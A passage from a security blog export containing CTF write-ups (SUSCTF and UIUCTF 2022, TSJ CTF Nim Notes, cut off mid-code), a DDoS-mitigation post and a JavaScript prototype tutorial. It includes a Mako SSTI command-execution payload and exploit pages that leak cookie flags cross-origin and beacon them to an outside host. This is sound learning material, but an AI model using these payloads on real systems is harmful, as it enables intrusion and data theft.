v1.0’s rrrevenge (14 solves)This question should have had an unexpected solution in the original version, so a new version was released. However, I was able to get the flag using the same method as before, so it seems that my solution was the expected one? (Supplement: According to the official writeup, it doesn’t seem to be.) web&#x2F;HTML practice (11 solves) This question gives you a page that can generate HTML. It looks like SSTI, but it doesn’t tell you what the template is behind it. After my teammate tried for a while, they found that some characters were blocked: $*_+[]&quot;&#39;/. Also, if you only put one %, it will cause an internal server error. After another round of trial and error, I found that ## means a comment because the content after it disappears. Then I used template engine ## comment to search and found some information, but I wasn’t sure if it was correct. So I continued to try random requests to the server and sent some invalid requests like this: POST generate HTTP/1.1. It returned an error message: HTTP&#x2F;1.1 400 Bad Request Content-Length: 133 Content-Type: text&#x2F;plain Invalid path in Request-URI: request-target must contain origin-form which starts with absolute-path (URI starting with a slash &quot;&#x2F;&quot;). I took this error message to Google and found the source: https://github.com/cherrypy/cheroot/blob/master/cheroot/server.py#L900. I also found this Python framework: CherryPy. I looked at the documentation and found this section: CherryPy does not provide any HTML template but its architecture makes it easy to integrate one. Popular ones are Mako or Jinja2. Mako uses &lt;% %&gt; and ## as comments, which seems to fit. Then my teammate confirmed this guess with this loop: % for a in (1,2,3): 1 % endfor After confirming that it was Mako, we started looking for how to use Mako SSTI. There are a lot of them here: PayloadsAllTheThings, but each one requires &lt;%%&gt; or $&#123;&#125;, which are blocked characters. At this point, I thought that since the above loop could use %, maybe other code could be used too, so I tried: % for a in (self.module.cache.util.os.system(name),2,3): 1 % endfor I found that it worked, and I could use the query string name to put the code I wanted to execute in it, avoiding the use of &#39;&quot;. After trying a few more times, I found that it couldn’t be sent out, so I couldn’t get the result. At this point, my teammate tried writing a file: echo%20&quot;hello&quot;%20&gt;%20$(pwd)/1, but it failed. Then I suddenly remembered, “Oh yeah, the homepage says the files will be stored under ./templates.” So I tried: echo &quot;hello&quot; &gt; .&#x2F;template&#x2F;huli.html I found that it was written, and I could read the file using http://124.71.178.252/view/huli.html?name=HelloWorld. While I was still thinking about what to do next, my teammate had already figured it out and solved it. cat &#x2F;flag &gt; .&#x2F;template&#x2F;huli.html After obtaining the flag, remember to echo it again to overwrite the flag and prevent other teams from reading it. SummaryThe other three web questions were more like reverse engineering, requiring code to be written to restore the obfuscated PHP. My teammates solved them, and the other two questions were about Java, testing the deserialization of CommonsCollections. It seems that a new gadget needs to be found, and my teammates solved them as well. This CTF made me realize that my biggest weakness in web is that I am not familiar enough with Java. I should find some time to study it. I am also not very familiar with deserialization, whether it is Python, PHP, or Java, and I should research it more. Finally, I would like to thank my amazing teammates. Together, we successfully won first place in SUSCTF 2022 🎉.","link":"/2022/03/01/en/susctf-2022-writeup/"},{"title":"[Experience] Struggling with DDoS: nginx, iptables and fail2ban","text":"Recently, there was an incident where our server was attacked by a large number of requests. Unfortunately, the server was hosting a forum service. Assuming that the attack point was the forum homepage, each request would query the database and there were a lot of joins. Some of the instructions were POST, which would update the database. This caused the database to lock up and the CPU to skyrocket, leading to a crash. If the forum was self-written, we could add a cache like Redis between the database and application. However, this forum system is someone else’s and we cannot modify it. First, let me briefly explain the architecture. In order to distribute traffic, there is an AWS ELB in front of two machines doing load balancing. All requests go to the ELB first and then automatically to one of the two machines in the back. What should we do after being attacked? The first thing that comes to mind is to use the service provided by AWS: WAF to block it.https://aws.amazon.com/tw/waf/ However, it was found that WAF was different from what was originally thought. It cannot set rules like “block IPs that send more than 100 requests within 10 seconds”. We can only continue to find solutions on the Internet and found a solution to block it from nginx: nginx防止DDOS攻击配置通过Nginx和Nginx Plus阻止DDoS攻击Module ngx_http_limit_req_module http &#123; &#x2F;&#x2F;Trigger condition, limit IP to 10 requests per second limit_req_zone $binary_remote_addr zone&#x3D;one:10m rate&#x3D;10r&#x2F;s; server &#123; location ~ \\.php$ &#123; &#x2F;&#x2F;Action to be executed limit_req zone&#x3D;one burst&#x3D;5 nodelay; &#125; &#125; &#125; In short, we use limit_req_zone, which is provided by nginx, to declare a zone called one that stores the state with a size of 10mb. Here, 10r/s means 10 requests per second. Then add limit_req zone=one burst=5 nodelay; where you want to block it, and it will be blocked. Nginx will adjust the number of requests processed to “up to 10 per second”. If an IP has more than 5 requests that have not been processed at the same time, it will return 503 service temporarily unavailable. The value of 5 here is set by burst. The returned status code can also be specified by yourself, for example: limit_req_status 505; Although this solution looks great, for some reason, it seems to have no effect after adding it. The server alarm is still ringing, and the database is still skyrocketing. After consulting with other colleagues, it was learned that iptables can also block it, and it is directly blocked from the TCP layer. I found the following two pieces of information: 淺談DDoS攻擊防護 -A INPUT -p tcp –dports 80 -j WEB_SRV_DOS -A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –rcheck –second 30 –hitcount 200 -j LOG –log-prefix &quot;[Possible DOS Attack]&quot; -A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –rcheck –second 30 –hitcount 200 -j REJECT -A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –set -A WEB_SRV_DOS -p tcp –dports 80 -j ACCEPT Limiting the number of connections from the same IP within a certain time using iptables -A INPUT -p tcp --dport 80 -m recent --rcheck --seconds 1 --hitcount 5 --name HTTP_LOG --rsource -j DROP -A INPUT -p tcp --dport 80 -m recent --set --name HTTP_LOG --rsource -A INPUT -p tcp --dport 80 -j ACCEPT The principles of the two are the same, using the -m recent --rcheck --second 30 --hitcount 200 statement to describe how many requests to block within a few seconds, and reject or drop the connection. Blocking directly from iptables sounds like a better solution, so that requests won’t even go into nginx and will be blocked. But unfortunately, after trying it out, it still didn’t work! How could this be? Discouraged, a colleague recommended a good tool called fail2ban. After checking it out, I found that it was very easy to use and the principle was easy to understand. I decided to test it on another machine and then apply it to the formal environment machine after successful testing. Preventing brute force attacks with Fail2Ban (SSH, vsftp, dovecot, sendmail)fail2ban tutorialUsing fail2ban in Ubuntu to judge and block large amounts of access Combining the descriptions of several of them, the following process can be obtained: Modify vim /etc/fail2ban/jail.local Write [http-get-dos] enabled &#x3D; true port &#x3D; http filter &#x3D; http-get-dos logpath &#x3D; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log # log to be judged maxretry &#x3D; 100 # maximum number of times findtime &#x3D; 5 # time interval bantime &#x3D; 600 # how long to ban action &#x3D; iptables[name&#x3D;HTTP, port&#x3D;http, protocol&#x3D;tcp] The above rule is: try 100 times within 5 seconds and ban for 600 seconds after failure. Add /etc/fail2ban/filter.d/http-get-dos.confThe file name here corresponds to the name set in jail.local just now. [Definition] failregex &#x3D; ^&lt;HOST&gt;- - .*\\&quot;(GET|POST).* ignoreregex &#x3D; The failregex here should be written according to your log. For example, the nginx access log looks like this: 106.184.3.122 - - [21&#x2F;Jul&#x2F;2016:11:38:29 +0000] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 396 &quot;-&quot; &quot;Go-http-client&#x2F;1.1&quot; You can write a regular expression that can capture &lt;HOST&gt;, which is the IP. After all the settings are done, restart it and it should work. You will find that after sending requests continuously, you will be banned. You can use iptables --list to see if you have really been banned. The principle of fail2ban should be to look at the log file and rules you specified, use this file to determine whether it exceeds the set rules, and if it exceeds, extract the IP and add the rules to iptables to block it. After the time is up, remove the rules. At this point, it finally succeeded! But since the principle is also iptables, why didn’t it work just now?Remember that I mentioned the server architecture at the beginning? One ELB in front and two web servers behind. Because ELB is a service provided by AWS, the customization is very low, and even ssh cannot be used. Therefore, the solutions attempted above are individually applied to those two web servers. Then the problem arises: Huh? Then the source of the web server’s request is all ELB’s IP, right? That’s right, you’ve overcome the blind spot! The reason it didn’t work before was because you used iptables to block the traffic, but since the source is all ELB’s IP, it only blocks ELB, not the real attacker. This causes the ELB to be blocked, and the entire service becomes super slow because of one attacker. So in this network environment, iptables won’t work! What about nginx? Do you remember our rule? limit_req_zone $binary_remote_addr zone&#x3D;one:10m rate&#x3D;10r&#x2F;s; $binary_remote_addr will also capture ELB’s IP. At this point, a sudden inspiration came to mind. Can we set it based on the X-Forwarded-For header? Then it will be the real IP. Found this article: nginx rate limiting with X-Forwarded-For header Replace $binary_remote_addr with $http_x_forwarded_for. Done! After experiencing a lot of hardships, the attack traffic was finally blocked in nginx. After testing with JMeter, it was found that it was indeed successful, and the extra requests will directly return 503. It’s really gratifying.","link":"/2016/07/21/en/the-battle-against-ddos-nginx-iptables-and-fail2ban/"},{"title":"UIUCTF 2022 Notes","text":"I didn’t participate in this CTF, but I found two interesting problems related to content type and I want to write down the solutions. modernism(21 solves)The code is super simple: from flask import Flask, Response, request app = Flask(__name__) @app.route('/') def index(): prefix = bytes.fromhex(request.args.get(\"p\", default=\"\", type=str)) flag = request.cookies.get(\"FLAG\", default=\"uiuctf&#123;FAKEFLAG&#125;\").encode() #^uiuctf&#123;[A-Za-z]+&#125;$ return Response(prefix+flag, mimetype=\"text/plain\") It will hex decode the data you send and add it to the flag in the response. An admin bot will visit your page with the flag in the cookie. I originally thought that text/plain cannot be loaded as a script, even if X-Content-Type-Options: nosniff is not added. Later, I found out that I remembered it wrong, and it is actually possible. The relevant code is in third_party&#x2F;blink&#x2F;renderer&#x2F;platform&#x2F;loader&#x2F;allowed_by_nosniff.cc // Helper function to decide what to do with with a given mime type. This takes // - a mime type // - inputs that affect the decision (is_same_origin, mime_type_check_mode). // // The return value determines whether this mime should be allowed or blocked. // Additionally, warn returns whether we should log a console warning about // expected future blocking of this resource. 'counter' determines which // Use counter should be used to count this. 'is_worker_global_scope' is used // for choosing 'counter' value. bool AllowMimeTypeAsScript(const String&amp; mime_type, bool same_origin, AllowedByNosniff::MimeTypeCheck mime_type_check_mode, WebFeature&amp; counter) &#123; using MimeTypeCheck = AllowedByNosniff::MimeTypeCheck; // If strict mime type checking for workers is enabled, we'll treat all // \"lax\" for worker cases as strict. if (mime_type_check_mode == MimeTypeCheck::kLaxForWorker &amp;&amp; RuntimeEnabledFeatures::StrictMimeTypesForWorkersEnabled()) &#123; mime_type_check_mode = MimeTypeCheck::kStrict; &#125; // The common case: A proper JavaScript MIME type if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType(mime_type)) return true; // Check for certain non-executable MIME types. // See: // https://fetch.spec.whatwg.org/#should-response-to-request-be-blocked-due-to-mime-type? if (mime_type.StartsWithIgnoringASCIICase(\"image/\")) &#123; counter = WebFeature::kBlockedSniffingImageToScript; return false; &#125; if (mime_type.StartsWithIgnoringASCIICase(\"audio/\")) &#123; counter = WebFeature::kBlockedSniffingAudioToScript; return false; &#125; if (mime_type.StartsWithIgnoringASCIICase(\"video/\")) &#123; counter = WebFeature::kBlockedSniffingVideoToScript; return false; &#125; if (mime_type.StartsWithIgnoringASCIICase(\"text/csv\")) &#123; counter = WebFeature::kBlockedSniffingCSVToScript; return false; &#125; if (mime_type_check_mode == MimeTypeCheck::kStrict) &#123; return false; &#125; DCHECK(mime_type_check_mode == MimeTypeCheck::kLaxForWorker || mime_type_check_mode == MimeTypeCheck::kLaxForElement); // Beyond this point we handle legacy MIME types, where it depends whether // we still wish to accept them (or log them using UseCounter, or add a // deprecation warning to the console). if (EqualIgnoringASCIICase(mime_type, \"text/javascript1.6\") || EqualIgnoringASCIICase(mime_type, \"text/javascript1.7\")) &#123; // We've been excluding these legacy values from UseCounter stats since // before. return true; &#125; if (mime_type.StartsWithIgnoringASCIICase(\"application/octet-stream\")) &#123; counter = kApplicationOctetStreamFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringASCIICase(\"application/xml\")) &#123; counter = kApplicationXmlFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringASCIICase(\"text/html\")) &#123; counter = kTextHtmlFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringASCIICase(\"text/plain\")) &#123; counter = kTextPlainFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringCase(\"text/xml\")) &#123; counter = kTextXmlFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringCase(\"text/json\") || mime_type.StartsWithIgnoringCase(\"application/json\")) &#123; counter = kJsonFeatures[same_origin]; &#125; else &#123; counter = kUnknownFeatures[same_origin]; &#125; return true; &#125; However, even if it can be loaded as a script, it is not easy to make it executable because the flag contains &#123;&#125;. The unexpected solution is to use a class. Adding class in front of the flag makes it class uiuctf&#123;fakeflag&#125;, and with this, you can get the entire string that was declared when the class was declared by using uiuctf+&#39;&#39;, and then you get the flag. The expected solution is to add a BOM in front of the flag, so that JS interprets the entire script in UTF-16, and the original flag becomes strange Chinese characters, so it won’t break. You can add ++window. in front, and then look at each property of the window. The author’s solution is as follows: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\" /> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /> &lt;title>Static Template&lt;/title> &lt;/head> &lt;body> &lt;!-- we use a BOM (byte order mark) to change the encoding of the document and cause it to be interpreted as valid JS BOM = magic unicode character at start of document to indicate encoding and endianness chrome supports the UTF16-BE and UTF16-LE BOMs: FE FF and FF FE we then encode: ++window. as UTF16-BE 2B2B7769006E0064006F0077002E so the JS executed is: ++window.RANDOM_UNICODE_CHARACTERS - luckily, when decoding the flag format as UTF-16 BE, the resultant characters will always be a valid JS identifier - this is NOT true in precisionism, due to the space and ! characters in the suffix Finally, we iterate through the `window` object, and utf16-be encode the added property to get the flag --> &lt;script src=\"https://modernism-web.chal.uiuc.tf/?p=FEFF002B002B00770069006E0064006F0077002E\">&lt;/script> &lt;script> const encutf16=(s)=>[...s].flatMap(c=>[String.fromCharCode(c.charCodeAt(0)>>8),String.fromCharCode(c.charCodeAt(0)&amp;0xff)]).join(''); const flag = Object.getOwnPropertyNames(window).map(x=>encutf16(x)).find(x=>x.startsWith('uiuctf&#123;')); navigator.sendBeacon(\"//hc.lc/log2.php?modernism\",flag); &lt;/script> &lt;/body> &lt;/html> precisionism(3 solves)This problem is similar to the previous one, but with some additional content at the end: from flask import Flask, Response, request app = Flask(__name__) @app.route('/') def index(): prefix = bytes.fromhex(request.args.get(\"p\", default=\"\", type=str)) flag = request.cookies.get(\"FLAG\", default=\"uiuctf&#123;FAKEFLAG&#125;\").encode() #^uiuctf&#123;[0-9A-Za-z]&#123;8&#125;&#125;$ return Response(prefix+flag+b\"Enjoy your flag!\", mimetype=\"text/plain\") Because of the additional content, the previous two methods cannot be used. The expected solution for this problem is to make the response an ICO format, and then put the part to be leaked into the width, so that you can get the width of the image cross-origin, and get one byte at a time: The author’s solution is as follows: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\" /> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /> &lt;title>Static Template&lt;/title> &lt;/head> &lt;body> &lt;h1> This is a static template, there is no bundler or bundling involved! &lt;/h1> &lt;script> const sleep = () => new Promise((res) => setTimeout(res, 50)); async function exfil(i) &#123; let img = new Image(); let p = \"00000100020001010000010020006804000026000000\"; if (i>0) p = p.slice(0, -i*2); img.src = `https://precisionism-web.chal.uiuc.tf/?p=$&#123;p&#125;`; await img.decode(); return img.width; &#125; async function main() &#123; for (let i = 0; i &lt; 16; i++) &#123; let c = await exfil(i); console.log(String.fromCharCode(c)); navigator.sendBeacon(\"//hc.lc/log2.php?precisionism\",String.fromCharCode(c)+\" \"+c) &#125; &#125; main(); &lt;/script> &lt;/body> &lt;/html> SummaryI also studied how Chromium does mime sniffing, but it seems to have little to do with this problem, so I will note the location: https://source.chromium.org/chromium/chromium/src/+/master:net/base/mime_sniffer.cc","link":"/2022/08/01/en/uiuctf-2022-writeup/"},{"title":"Understanding JavaScript Prototype Chain","text":"IntroductionTo be honest, the prototype chain in JavaScript has always been a topic that I am afraid of. The reason is simple, it is really difficult to understand. Just a bunch of terms and complex relationships can drive you crazy, such as prototype, __proto__, constructor, Object.prototype, Function.prototype, new, etc. However, this is indeed a very important part of JavaScript and a must-have question for interviews. Even if you don’t understand it now, you will eventually have to understand it someday, otherwise you will never be able to improve your technical skills. There are many articles about the prototype chain that you can find on the internet, and each one has a different way of understanding it. Some of them directly use a lot of technical terms, which can scare you to death. It wasn’t until recently that I read a few articles that I thought had a better perspective, that I truly understood the prototype chain. So, let’s take this opportunity to learn more about the prototype chain in JavaScript! This article is suitable for those who have a basic understanding of JavaScript but are not very clear about it. If there are any mistakes in the article, please feel free to point them out in the comments. Thank you. Class in JavaScriptTo understand the prototype chain, you can start with these two great articles: Designing Ideas of Inheritance Mechanism in JavaScript Explaining JavaScript Prototype Chain from Its Design Intention These two articles explain why the mechanism of JavaScript was designed in this way. I think starting from this perspective will be a better start. (It is strongly recommended to read these two articles before continuing, which will help you better understand what the prototype chain is.) First of all, unlike Java or other object-oriented programming languages, JavaScript does not have a class (ES6’s class is just syntactic sugar). However, even without a class, it can still design a similar mechanism to achieve almost the same functionality. In Java, if you want to create an instance from a class, you can write: Point p = new Point(); So JavaScript uses this syntax and has the keyword new. But since JavaScript doesn’t have a class, what should come after new? At this point, it thought that every class calls the constructor when it is initialized, right? That is, the constructor function. So in JavaScript, just follow the constructor function! So, the following code is easy to understand: // constructor function Person(name, age) &#123; this.name = name; this.age = age; &#125; var nick = new Person('nick', 18); var peter = new Person('peter', 18); As mentioned above, Person is a constructor function that can be used to create an instance with the new keyword. If you only look at the declaration of nick below (var nick = new Person(&#39;nick&#39;, 18);), doesn’t the syntax look 87% similar to when you were writing Java? In addition, you can also add some methods to Person. function Person(name, age) &#123; this.name = name; this.age = age; this.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; &#125; var nick = new Person('nick', 18); nick.log(); // nick, age:18 var peter = new Person('peter', 20); peter.log(); // peter, age:20 However, there is still a small problem with this. The name and age properties are obviously different for each instance. But the log method is actually shared among all instances because they are doing the same thing. In the current situation, although the log function of nick and peter are doing the same thing, they actually occupy two different spaces, meaning that they are two different functions. function Person(name, age) &#123; this.name = name; this.age = age; this.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; &#125; var nick = new Person('nick', 18); var peter = new Person('peter', 20); console.log(nick.log === peter.log) // false So what can we do? We can extract this function and turn it into a method that all Persons can share. Speaking of which, you should have heard of something called prototype. Just assign the log function to Person.prototype, and all instances of Person can share this method. function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); var peter = new Person('peter', 20); console.log(nick.log === peter.log) // true // The function still works the same as before nick.log(); // nick, age:18 peter.log(); // peter, age:20 Some people directly add some functions to Array.prototype to make it easier for themselves to do some operations, and the principle is the same. However, in general, it is not recommended to directly modify objects that do not belong to you. Array.prototype.last = function () &#123; return this[this.length - 1]; &#125;; console.log([1,2,3].last()) // 3 Finally, let’s summarize for everyone. The above paragraph is actually mainly to review some basics of JavaScript for everyone. You have a function called Person, which can be used as a constructor. You can use var obj = new Person() to create an instance of Person, and you can add properties or methods that you want all instances to share on Person.prototype. Exploring the PrincipleI don’t know if you are curious about one thing. For example, in the example of var nick = new Person(&#39;nick&#39;, 18);, when I call nick.log(), how does JavaScript find this function? Because the nick instance itself does not have the log function. But according to the mechanism of JavaScript, nick is an instance of Person, so if it cannot be found in nick itself, it will try to find it from Person.prototype. However, how does JavaScript know to look for the log function in Person.prototype? So it must be that nick and Person.prototype are connected in some way, so it knows where to look for the log function. And the way of this connection is __proto__.(Note: A better way is actually to use Object.getPrototypeOf(), but here for convenience, we still use the more common __proto__. For more detailed explanations, please refer to: MDN: Object.prototype.proto) function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); console.log(nick.__proto__ === Person.prototype) // true nick’s __proto__ points to Person.prototype, so when JavaScript finds that nick does not have the log method, it will try to find Person.prototype through __proto__ and see if Person.prototype has the log method. What if Person.prototype still doesn’t have it? Then, according to this rule, it will look for the log method in Person.prototype.__proto__, and so on, until it finds something whose __proto__ is null. This means that this is the top level. The chain that is constantly linked together through __proto__ is called the prototype chain. Through this prototype chain, you can achieve similar inheritance functionality and call your parent’s method. You may have some feelings about the following code: function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); // As mentioned earlier, nick.__proto__ will point to Person.prototype console.log(nick.__proto__ === Person.prototype) // true // Who will Person.prototype.__proto__ point to? It will point to Object.prototype console.log(Person.prototype.__proto__ === Object.prototype) // true // Who will Object.prototype.__proto__ point to? It will point to null, which is the top of the prototype chain console.log(Object.prototype.__proto__) // null If you want to know if a property exists on an instance or in its prototype chain, you can use the hasOwnProperty method: function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); console.log(nick.hasOwnProperty('log')); // false console.log(nick.__proto__.hasOwnProperty('log')); // true With hasOwnProperty, we can simulate the process of finding upwards: function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); function call(obj, methodName) &#123; var realMethodOwner = obj; // Keep looking up until null or the person who really owns this method is found while(realMethodOwner &amp;&amp; !realMethodOwner.hasOwnProperty(methodName)) &#123; realMethodOwner = realMethodOwner.__proto__; &#125; // Throw an error if not found, otherwise execute this method if (!realMethodOwner) &#123; throw 'method not found.'; &#125; else &#123; realMethodOwner[methodName].apply(obj); &#125; &#125; call(nick, 'log'); // nick, age:18 call(nick, 'not_exist'); // Uncaught method not found. By this point, you should have a deeper understanding of the prototype chain. Let me ask you a question, what is `Person.__proto__`? ``` js function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); console.log(Person.__proto__ === Function.prototype); // true console.log(Function.prototype.__proto__ === Object.prototype) // true console.log(Object.prototype.__proto__); //null Since Person is actually an instance of Function, Person.__proto__ is of course Function.prototype! instanceofAs the name suggests, A instanceof B is used to determine whether A is an instance of B. For example: function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); console.log(nick instanceof Person); // true console.log(nick instanceof Object); // true console.log(nick instanceof Array); // false From the example, it can be seen that as long as B’s prototype can be found in A’s prototype chain, true will be returned. After understanding the principle, we can also simulate what instanceof is doing: function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); function instanceOf(A, B) &#123; // Already found if (!A) return false; // If not found, continue searching up the chain return A.__proto__ === B.prototype ? true : instanceOf(A.__proto__, B); &#125; console.log(instanceOf(nick, Person)); // true console.log(instanceOf(nick, Object)); // true console.log(instanceOf(nick, Array)); // false And instanceof has an interesting phenomenon, which is: // These two are each other's instance console.log(Function instanceof Object); // true console.log(Object instanceof Function); // true // Function's __proto__ will point to Function.prototype // And Function.prototype's __proto__ will point to Object.prototype console.log(Function.__proto__ === Function.prototype); // true console.log(Function.__proto__.__proto__ === Object.prototype); //true // Object's __proto__ will point to Function.prototype console.log(Object.__proto__ === Function.prototype); // true This thing will make the problem more complicated, so I won’t mention it here. If you want to know, you can refer to the following two articles: Understanding JS Objects and Prototype Chains from proto and prototype Understanding JavaScript’s Prototype Chain and Inheritance constructorBy the way, each prototype has a property called constructor, for example, Person.prototype.constructor, and this property will point to the constructor function. What is the constructor of Person.prototype? Of course, it is Person. function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); // This is to let everyone know that we are actually looking up the prototype chain here console.log(nick.constructor === Person); // true console.log(nick.hasOwnProperty('constructor')); // false // Person's constructor is Person console.log(Person.prototype.constructor === Person); // true console.log(Person.prototype.hasOwnProperty('constructor')); // true So actually there is nothing special about constructor, A.prototype.constructor === A, you can use values like Function, Person, Object, etc. for A. There is an interesting thing, you can execute a piece of code in this way: [].slice.constructor(&#39;alert(1)&#39;)(). The principle is actually to replace the Function of Function(&#39;alert(1)&#39;)() with [].slice.constructor. newWith the concept of prototype chain, it is not difficult to understand what new does behind the scenes. Assuming there is a line of code: var nick = new Person(&#39;nick&#39;);, then it has the following things to do: Create a new object, let’s call it O Point O’s __proto__ to Person’s prototype to inherit the prototype chain Call the constructor function Person with O as the context Return O We can write a piece of code to simulate this situation: function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; function newObj(Constructor, arguments) &#123; var o = new Object(); // Let o inherit the prototype chain o.__proto__ = Constructor.prototype; // Call the constructor function Constructor.apply(o, arguments); // Return the created object return o; &#125; var nick = newObj(Person, ['nick', 18]); nick.log(); // nick, age:18 Further reading: JS Object Mechanism Deep Dive - new Operator SummaryToday, not only do we understand what the prototype chain is, but we also wrote some simple programs to simulate JavaScript’s process of looking up the prototype chain. By implementing these mechanisms ourselves, we should have a better understanding of the prototype chain. In the JavaScript programming language, it is through the mechanism of the prototype chain that the relationship between parent and child is linked. When you cannot find something in A, you can go to A’s parent (i.e. A.__proto__) to find it, and if you still can’t find it, you can go up further. The end of the prototype chain is Object.prototype, and beyond that is null. When writing this article, I referred to many sources, which I have included below. Some articles come with beautiful pictures, but I think starting with pictures can be a bit confusing because you don’t know how they are related to each other. After reading this article, I suggest you take a look at the reference materials below and review your own understanding. Reference Materials JavaScript深入之从原型到原型链 JS原型链图解教程 理解JavaScript的原型链和继承 从__proto__和prototype来深入理解JS对象和原型链 Javascript 原型链 彻底理解JavaScript原型","link":"/2017/08/27/en/the-javascripts-prototype-chain/"},{"title":"TSJ CTF 2022 - web/Nim Notes Notes","text":"Last weekend, in addition to the SUSCTF 2022 I wrote about in my previous post, there was also another TSJ CTF with many good challenges. Due to time constraints, I only chose the ones that interested me more, and this is the Nim Notes challenge mentioned in the title. I didn’t manage to solve it in the end (I was far from it), but the solution was very interesting, so I’m writing this post to record the official solution. The author’s (maple3142) writeup is here: https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes Challenge Introduction and SolutionChallenge description: I made this note taking web app in Nim as a part of learning it. If you have some cool notes about Nim please share it with me! In short, it’s another common note-taking web app in CTF. After logging in, you can add notes and report your note page to the admin bot. When rendering the note page, it doesn’t directly spit out data from the backend, but instead uses the API to fetch data from the frontend and render it on the screen. The HTML of the note page looks like this: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\" /> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /> &lt;link rel=\"stylesheet\" href=\"/css/bootstrap.min.css\" /> &lt;title>Notes&lt;/title> &lt;/head> &lt;body class=\"d-flex flex-column min-vh-100\"> &lt;!-- navbar --> &lt;nav class=\"navbar navbar-expand-lg navbar-dark bg-dark mb-3\"> &lt;div class=\"container-fluid\"> &lt;span class=\"navbar-brand mb-0 h1\">Notes&lt;/span> &lt;ul class=\"navbar-nav\"> &lt;li class=\"nav-item\"> &lt;a class=\"nav-link\" id=\"share-btn\" href=\"javascript:void\">Share To Admin&lt;/a> &lt;/li> &lt;li class=\"nav-item\"> &lt;a class=\"nav-link\" id=\"logout-btn\" href=\"javascript:void\">Logout&lt;/a> &lt;/li> &lt;/ul> &lt;/div> &lt;/nav> &lt;!-- editing area --> &lt;div class=\"container\"> &lt;div class=\"row justify-content-md-center\"> &lt;div class=\"col-8\"> &lt;div class=\"mb-3\"> &lt;input id=\"title\" class=\"form-control\" placeholder=\"Title\" /> &lt;textarea id=\"content\" class=\"form-control\" placeholder=\"e.g. I learned how to use `template` in Nim today :)\" >&lt;/textarea> &lt;div class=\"d-grid gap-2\"> &lt;button class=\"btn btn-primary\" id=\"add-btn\">Add&lt;/button> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;!-- note template --> &lt;template id=\"note-tmpl\"> &lt;div class=\"col-4\"> &lt;div class=\"card\"> &lt;div class=\"card-body\"> &lt;h5 class=\"note-title card-title\">title&lt;/h5> &lt;h6 class=\"note-author card-subtitle mb-2 text-muted\">author&lt;/h6> &lt;p class=\"note-content card-text\">text&lt;/p> &lt;/div> &lt;/div> &lt;/div> &lt;/template> &lt;!-- note container --> &lt;div class=\"container\"> &lt;div class=\"row\" id=\"notes-container\">&lt;/div> &lt;/div> &lt;!-- footer --> &lt;div class=\"d-flex justify-content-md-center mt-auto\"> &lt;p>&amp;copy; 2022-2087 All rights reserved.&lt;/p> &lt;/div> &lt;!-- hidden logout form--> &lt;form hidden=\"true\" id=\"logout-form\" action=\"/logout\" method=\"post\">&lt;/form> &lt;!-- scripts and recaptcha --> &lt;div class=\"g-recaptcha\" data-sitekey=\"$#\" data-callback=\"tokenCallback\" data-size=\"invisible\">&lt;/div> &lt;script src=\"/js/purify.min.js\">&lt;/script> &lt;script src=\"/js/marked.min.js\">&lt;/script> &lt;script src=\"/js/app.js\">&lt;/script> &lt;script async src=\"https://www.google.com/recaptcha/api.js\">&lt;/script> &lt;/body> &lt;/html> The main logic is in app.js: // rendering notes const container = document.getElementById('notes-container') function createNote(note) &#123; const el = document.importNode(document.getElementById('note-tmpl').content, true) el.querySelector('.note-title').textContent = note.title el.querySelector('.note-author').textContent = note.author el.querySelector('.note-content').innerHTML = DOMPurify.sanitize(marked.parse(note.content)) return el &#125; function loadNotes() &#123; container.textContent = '' fetch('/api/notes' + location.search) .then(r => r.json()) .then(notes => &#123; 